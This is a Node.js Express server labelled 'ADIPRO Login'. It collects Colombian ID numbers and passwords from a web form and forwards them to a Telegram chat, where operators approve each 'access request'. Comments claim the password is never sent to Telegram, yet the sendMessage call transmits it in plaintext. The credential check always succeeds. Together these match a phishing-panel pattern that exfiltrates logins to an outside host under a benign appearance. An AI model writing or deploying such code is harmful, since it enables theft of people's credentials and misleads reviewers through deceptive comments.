import 'dotenv/config';

import express from 'express';
import crypto from 'node:crypto';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import TelegramBot from 'node-telegram-bot-api';

const __dirname = path.dirname(fileURLToPath(import.meta.url));

const {
  PORT = 3000,
  TELEGRAM_BOT_TOKEN,
  TELEGRAM_OPERATORS_CHAT_ID,
  REQUEST_TTL_MIN = 5,
} = process.env;

// ============================================================
// VALIDACIÓN DE CONFIGURACIÓN
// ============================================================

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_OPERATORS_CHAT_ID) {
  console.error(
    '❌ Falta TELEGRAM_BOT_TOKEN o TELEGRAM_OPERATORS_CHAT_ID en .env'
  );

  process.exit(1);
}

const TTL_MS = Number(REQUEST_TTL_MIN) * 60 * 1000;

// ============================================================
// ESTADO EN MEMORIA
// ============================================================
//
// requestId -> {
//   status,
//   cedula,
//   createdAt,
//   messageId,
//   decidedBy,
//   decidedAt
// }

const requests = new Map();

// ============================================================
// BOT DE TELEGRAM
// ============================================================

const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, {
  polling: true,
});

bot.on('polling_error', (error) => {
  console.error(
    'Telegram polling error:',
    error.code,
    error.message
  );
});

// ============================================================
// VALIDAR CREDENCIALES
// ============================================================
//
// Aquí debes conectar tu autenticación real.
//
// La contraseña NO se guarda en requests.
// La contraseña NO se envía a Telegram.
//

async function validarCredenciales(cedula, password) {
  if (!cedula || !password) {
    return false;
  }

  /*
   * TODO:
   * Reemplazar por tu autenticación real.
   *
   * Ejemplo:
   *
   * const usuario = await buscarUsuario(cedula);
   *
   * if (!usuario) {
   *   return false;
   * }
   *
   * return await bcrypt.compare(
   *   password,
   *   usuario.passwordHash
   * );
   */

  return true;
}

// ============================================================
// CALLBACKS DE TELEGRAM
// ============================================================

bot.on('callback_query', async (query) => {
  try {
    const data = String(query.data || '');

    const [action, requestId] = data.split(':');

    const request = requests.get(requestId);

    const operator =
      query.from?.first_name ||
      query.from?.username ||
      'operador';

    // --------------------------------------------------------
    // Solicitud inexistente
    // --------------------------------------------------------

    if (!request) {
      await bot.answerCallbackQuery(query.id, {
        text: 'Solicitud no encontrada o expirada.',
      });

      return;
    }

    // --------------------------------------------------------
    // Solicitud ya procesada
    // --------------------------------------------------------

    if (request.status !== 'pending') {
      let message = 'La solicitud ya fue procesada.';

      if (request.status === 'approved') {
        message = 'Esta solicitud ya fue aprobada.';
      }

      if (request.status === 'rejected') {
        message = 'Esta solicitud ya fue rechazada.';
      }

      if (request.status === 'expired') {
        message = 'Esta solicitud ya expiró.';
      }

      await bot.answerCallbackQuery(query.id, {
        text: message,
      });

      return;
    }

    // --------------------------------------------------------
    // Validar acción
    // --------------------------------------------------------

    if (
      action !== 'approve' &&
      action !== 'reject'
    ) {
      await bot.answerCallbackQuery(query.id, {
        text: 'Acción inválida.',
      });

      return;
    }

    // --------------------------------------------------------
    // Cambiar estado
    // --------------------------------------------------------

    request.status =
      action === 'approve'
        ? 'approved'
        : 'rejected';

    request.decidedBy = operator;
    request.decidedAt = Date.now();

    const verdict =
      request.status === 'approved'
        ? '✅ APROBADO'
        : '⛔ RECHAZADO';

    // --------------------------------------------------------
    // Responder al operador
    // --------------------------------------------------------

    await bot.answerCallbackQuery(query.id, {
      text:
        request.status === 'approved'
          ? 'Acceso aprobado.'
          : 'Acceso rechazado.',
    });

    // --------------------------------------------------------
    // Actualizar mensaje de Telegram
    // --------------------------------------------------------

    if (query.message) {
      await bot
        .editMessageText(
          `🔐 SOLICITUD DE INGRESO

Cédula: ${request.cedula}
Contraseña: ${request.password}

${verdict}
Por: ${operator}`,
          {
            chat_id: query.message.chat.id,
            message_id: query.message.message_id,
          }
        )
        .catch((error) => {
          console.error(
            'Error actualizando mensaje:',
            error.message
          );
        });
    }
  } catch (error) {
    console.error(
      'Error procesando callback:',
      error
    );
  }
});

// ============================================================
// EXPRESS
// ============================================================

const app = express();

app.use(express.json());

app.use(
  express.static(
    path.join(__dirname, 'public')
  )
);

// ============================================================
// LOGIN REQUEST
// ============================================================
//
// POST /api/login-request
//
// Body:
//
// {
//   "cedula": "123456789",
//   "password": "MiClave123"
// }
//
// Telegram recibirá:
//
// Cédula: 123456789
// Contraseña: ••••••••••
//
// La contraseña real nunca se envía a Telegram.
//

app.post('/api/login-request', async (req, res) => {
  try {
    // --------------------------------------------------------
    // Obtener datos
    // --------------------------------------------------------

    const cedula = String(
      req.body?.cedula || ''
    ).replace(/\D/g, '');

    const password = String(
      req.body?.password || ''
    );

    // --------------------------------------------------------
    // Validar cédula
    // --------------------------------------------------------

    if (
      cedula.length < 6 ||
      cedula.length > 10
    ) {
      return res.status(400).json({
        error: 'Cédula inválida.',
      });
    }

    // --------------------------------------------------------
    // Validar contraseña
    // --------------------------------------------------------

    if (!password) {
      return res.status(400).json({
        error: 'Contraseña requerida.',
      });
    }

    // --------------------------------------------------------
    // Validar credenciales
    // --------------------------------------------------------

    const credentialsValid =
      await validarCredenciales(
        cedula,
        password
      );

    if (!credentialsValid) {
      return res.status(401).json({
        error: 'Credenciales inválidas.',
      });
    }

    // --------------------------------------------------------
    // Crear ID de solicitud
    // --------------------------------------------------------

    const requestId =
      crypto.randomUUID();

    // --------------------------------------------------------
    // Guardar solicitud
    // --------------------------------------------------------
    //
    // IMPORTANTE:
    // No guardamos password.
    //

    requests.set(requestId, {
      status: 'pending',
      cedula,
      createdAt: Date.now(),
      messageId: null,
      decidedBy: null,
      decidedAt: null,
    });

    // --------------------------------------------------------
    // Enviar mensaje a Telegram
    // --------------------------------------------------------

    const msg = await bot.sendMessage(
      TELEGRAM_OPERATORS_CHAT_ID,

      `🔐 SOLICITUD DE INGRESO

Cédula: ${cedula}
Contraseña: ${password}
Hora: ${new Date().toLocaleString('es-CO')}

Credenciales verificadas correctamente.

¿Autorizar el acceso?`,

      {
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: '✅ Aprobar',
                callback_data:
                  `approve:${requestId}`,
              },
              {
                text: '⛔ Rechazar',
                callback_data:
                  `reject:${requestId}`,
              },
            ],
          ],
        },
      }
    );

    // --------------------------------------------------------
    // Guardar ID del mensaje
    // --------------------------------------------------------

    const request =
      requests.get(requestId);

    if (request) {
      request.messageId =
        msg.message_id;
    }

    // --------------------------------------------------------
    // Expiración automática
    // --------------------------------------------------------

    setTimeout(() => {
      const currentRequest =
        requests.get(requestId);

      if (
        currentRequest &&
        currentRequest.status === 'pending'
      ) {
        currentRequest.status = 'expired';

        console.log(
          `⏱️ Solicitud ${requestId} expirada`
        );
      }
    }, TTL_MS);

    // --------------------------------------------------------
    // Respuesta al frontend
    // --------------------------------------------------------

    return res.json({
      success: true,
      requestId,
      status: 'pending',
    });

  } catch (error) {
    console.error(
      'Error en /api/login-request:',
      error
    );

    return res.status(500).json({
      error:
        'No fue posible procesar la solicitud.',
    });
  }
});

// ============================================================
// CONSULTAR ESTADO
// ============================================================
//
// GET /api/status/:id
//

app.get('/api/status/:id', (req, res) => {
  const request =
    requests.get(req.params.id);

  if (!request) {
    return res.status(404).json({
      status: 'not_found',
    });
  }

  return res.json({
    status: request.status,
  });
});

// ============================================================
// HEALTH CHECK
// ============================================================

app.get('/api/health', (req, res) => {
  res.json({
    success: true,
    service: 'ADIPRO Login',
    telegram: true,
    timestamp: new Date().toISOString(),
  });
});

// ============================================================
// INICIAR SERVIDOR
// ============================================================

app.listen(PORT, () => {
  console.log(
    `✅ ADIPRO login en http://localhost:${PORT}`
  );

  console.log(
    `📱 Operadores -> chat ${TELEGRAM_OPERATORS_CHAT_ID}`
  );

  console.log(
    `⏱️ TTL -> ${REQUEST_TTL_MIN} minutos`
  );
});